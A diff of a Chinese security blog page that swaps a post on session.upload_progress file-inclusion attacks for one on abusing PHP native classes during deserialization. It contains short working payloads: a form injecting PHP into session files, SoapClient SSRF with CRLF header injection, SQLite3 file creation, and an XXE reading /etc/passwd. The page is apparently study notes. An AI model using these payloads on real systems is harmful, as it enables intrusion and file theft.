@@ -22,7 +22,7 @@
     <meta name="description" content="">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>session.upload_progress的利用 · 阿杰的小站</title>
+    <title>PHP反序列化原生类魔术方法的利用 · 阿杰的小站</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -217,7 +217,7 @@
                 <a href="/" >阿杰的小站</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">session.upload_progress的利用</a>
+                <a href="#" class="post-name">PHP反序列化原生类魔术方法的利用</a>
             </div>
     </div>
     
@@ -247,7 +247,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            session.upload_progress的利用
+            PHP反序列化原生类魔术方法的利用
             <!-- 404 -->
             
         </h1>
@@ -272,12 +272,12 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count word-count">421</span>Reading time: <span class="post-count reading-time">1 min</span></span>
+                        <span>Word count: <span class="post-count word-count">339</span>Reading time: <span class="post-count reading-time">1 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2019/08/30</span>
+                    <span class="post-intro-time">2019/09/01</span>
                     
                     <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                         <span class="iconfont-archer">&#xe602;</span>
@@ -401,22 +401,24 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>session.upload_progress 是PHP5.4的新特征<br>当<code>session.upload_progress.enabled</code>选项开启时，PHP能够在每一个文件上传时监测上传进度。 这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态。<br>当一个上传在处理中，同时POST一个与INI中设置的<code>session.upload_progress.name</code>同名变量时，上传进度可以在<code>$_SESSION</code>中获得。 当PHP检测到这种POST请求时，它会在<code>$_SESSION</code>中添加一组数据, 索引是<code>session.upload_progress.prefix</code>与<code>session.upload_progress.name</code>连接在一起的值</p>
-<h2 id="设置session-upload-progress"><a href="#设置session-upload-progress" class="headerlink" title="设置session.upload_progress"></a>设置session.upload_progress</h2><p>修改php.ini<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">session.upload_progress.enabled = On</span><br><span class="line">session.upload_progress.cleanup = On</span><br><span class="line">session.upload_progress.prefix = &quot;upload_progress_&quot;</span><br><span class="line">session.upload_progress.name = &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line">session.upload_progress.freq = &quot;1%&quot;</span><br><span class="line">session.upload_progress.min_freq = &quot;1&quot;</span><br></pre></td></tr></table></figure></p>
-<p>cleanup的值为On时表示上传完后会删除session中的值，Off则不会，如果为On需要通过条件竞争来攻击。</p>
-<h2 id="适用目标"><a href="#适用目标" class="headerlink" title="适用目标"></a>适用目标</h2><p>如果网站开启phpinfo，如果发现<code>session.upload_progress.enabled = On</code>，那么即可对session文件的索引字段进行控制，间接控制session文件，如果存在文件包含漏洞，那么可以获得目标shell。</p>
-<h2 id="实验效果"><a href="#实验效果" class="headerlink" title="实验效果"></a>实验效果</h2><p>构造attack.html进行post上传控制session文件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;http://127.0.0.1/t/830/test.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;&lt;?= phpinfo(); ?&gt;&quot; /&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;demo&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;上传&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure></p>
-<p>查看后台session文件，可以发现session已被我们间接控制<br><img src="/img/1567142601524.png" alt=""></p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://skysec.top/2018/04/04/amazing-phpinfo/#session-upload-progress" target="_blank" rel="noopener">https://skysec.top/2018/04/04/amazing-phpinfo/#session-upload-progress</a><br><a href="https://blog.csdn.net/koastal/article/details/52980757" target="_blank" rel="noopener">https://blog.csdn.net/koastal/article/details/52980757</a></p>
+        <h2 id="SoapClient"><a href="#SoapClient" class="headerlink" title="SoapClient"></a>SoapClient</h2><p>方法：call<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">$target = &apos;http://127.0.0.1/flag.php&apos;;</span><br><span class="line">$a = new SoapClient(null, array(&apos;location&apos; =&gt; $target,</span><br><span class="line">	&apos;user_agent&apos; =&gt; &quot;AAA:BBB\r\n&quot; .</span><br><span class="line">	&quot;Cookie:PHPSESSID=2r4kt8t9l0c6hhq67e1bs4th90&quot;,</span><br><span class="line">	&apos;uri&apos; =&gt; &quot;http://127.0.0.1/&quot;));</span><br><span class="line">$b = serialize($a);</span><br><span class="line">echo $b;</span><br><span class="line">$c = unserialize($b);</span><br><span class="line">$c-&gt;a();</span><br></pre></td></tr></table></figure></p>
+<p>通过调用SoapClient类的<code>__call</code>方法可以触发ssrf攻击。<br><img src="/img/1567317309843.png" alt=""><br>通过抓包可以看到，本地127.0.0.1对自身发起了请求，并且SoapClient可以对header部分进行修改，可以实现SSRF攻击。</p>
+<h2 id="SQLite3"><a href="#SQLite3" class="headerlink" title="SQLite3"></a>SQLite3</h2><p>方法：construct<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sky=new SQLite3(&apos;/tmp/sky/evil.php&apos;);</span><br></pre></td></tr></table></figure></p>
+<p>通过SQLite3的<code>__construct</code>方法可以创建任意空白文件，怎么触发<code>__construct</code>我也不太清楚。</p>
+<h2 id="DirectoryIterator"><a href="#DirectoryIterator" class="headerlink" title="DirectoryIterator"></a>DirectoryIterator</h2><p>方法：toString、construct<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$dir = new DirectoryIterator(&apos;/tmp/sky/&apos;);</span><br><span class="line">foreach ($dir as $fileinfo) &#123;</span><br><span class="line">	echo $fileinfo.&quot;\n&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="SimpleXMLElement"><a href="#SimpleXMLElement" class="headerlink" title="SimpleXMLElement"></a>SimpleXMLElement</h2><p>方法：toString、construct<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$xml = new SimpleXMLElement(&apos;&lt;!DOCTYPE ANY [&lt;!ENTITY shit SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;root&gt;&amp;shit;&lt;/root&gt;&apos;,LIBXML_NOENT);</span><br><span class="line">echo $xml;</span><br></pre></td></tr></table></figure></p>
+<p>LIBXML_NOENT模式可以触发xml漏洞，echo可以进行回显</p>
+<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>上述了多个原生类的利用点，实际上他们都来自于一场真实的案例，原文如下：<br><a href="https://5haked.blogspot.com/2016/10/how-i-hacked-pornhub-for-fun-and-profit.html" target="_blank" rel="noopener">https://5haked.blogspot.com/2016/10/how-i-hacked-pornhub-for-fun-and-profit.html</a><br>该牛串联多个原生类序列化问题，最后成功对某知名网站的任意代码执行，有兴趣的可以好好拜读一下~</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://skysec.top/2019/05/05/Summary-of-serialization-attacks-Part-2/#SimpleXMLElement" target="_blank" rel="noopener">https://skysec.top/2019/05/05/Summary-of-serialization-attacks-Part-2/#SimpleXMLElement</a></p>
 
     </article>
     <!-- license  -->
     
         <div class="license-wrapper">
             <p>Author：<a href="http://yoursite.com">Kage</a>
-            <p>原文链接：<a href="http://yoursite.com/2019/08/30/session.upload_progress的利用/">http://yoursite.com/2019/08/30/session.upload_progress的利用/</a>
-            <p>发表日期：<a href="http://yoursite.com/2019/08/30/session.upload_progress的利用/">八月 30日 2019, 1:24:16 下午</a>
-            <p>更新日期：<a href="http://yoursite.com/2019/08/30/session.upload_progress的利用/">August 30th 2019, 1:24:16 pm</a>
+            <p>原文链接：<a href="http://yoursite.com/2019/09/01/PHP反序列化原生类魔术方法的利用/">http://yoursite.com/2019/09/01/PHP反序列化原生类魔术方法的利用/</a>
+            <p>发表日期：<a href="http://yoursite.com/2019/09/01/PHP反序列化原生类魔术方法的利用/">九月 1日 2019, 3:14:51 下午</a>
+            <p>更新日期：<a href="http://yoursite.com/2019/09/01/PHP反序列化原生类魔术方法的利用/">September 1st 2019, 3:14:51 pm</a>
             <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -424,17 +426,12 @@ height:50vh;
     <ul class="post-paginator">
         <li class="next">
             
-                <div class="nextSlogan">Next Post</div>
-                <a href= "/2019/08/31/2018-Xctf Final & bestphp-revenge/" title= "2018-Xctf Final & bestphp-revenge">
-                    <div class="nextTitle">2018-Xctf Final & bestphp-revenge</div>
-                </a>
-            
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href= "/2019/08/23/跨域实现-jsonp和CORS/" title= "跨域实现-jsonp和CORS">
-                    <div class="prevTitle">跨域实现-jsonp和CORS</div>
+                <a href= "/2019/08/31/2018-Xctf Final & bestphp-revenge/" title= "2018-Xctf Final & bestphp-revenge">
+                    <div class="prevTitle">2018-Xctf Final & bestphp-revenge</div>
                 </a>
             
         </li>
@@ -550,7 +547,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#定义"><span class="toc-number">1.</span> <span class="toc-text">定义</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#设置session-upload-progress"><span class="toc-number">2.</span> <span class="toc-text">设置session.upload_progress</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#适用目标"><span class="toc-number">3.</span> <span class="toc-text">适用目标</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#实验效果"><span class="toc-number">4.</span> <span class="toc-text">实验效果</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-number">5.</span> <span class="toc-text">参考</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#SoapClient"><span class="toc-number">1.</span> <span class="toc-text">SoapClient</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQLite3"><span class="toc-number">2.</span> <span class="toc-text">SQLite3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DirectoryIterator"><span class="toc-number">3.</span> <span class="toc-text">DirectoryIterator</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SimpleXMLElement"><span class="toc-number">4.</span> <span class="toc-text">SimpleXMLElement</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#实例"><span class="toc-number">5.</span> <span class="toc-text">实例</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-number">6.</span> <span class="toc-text">参考</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
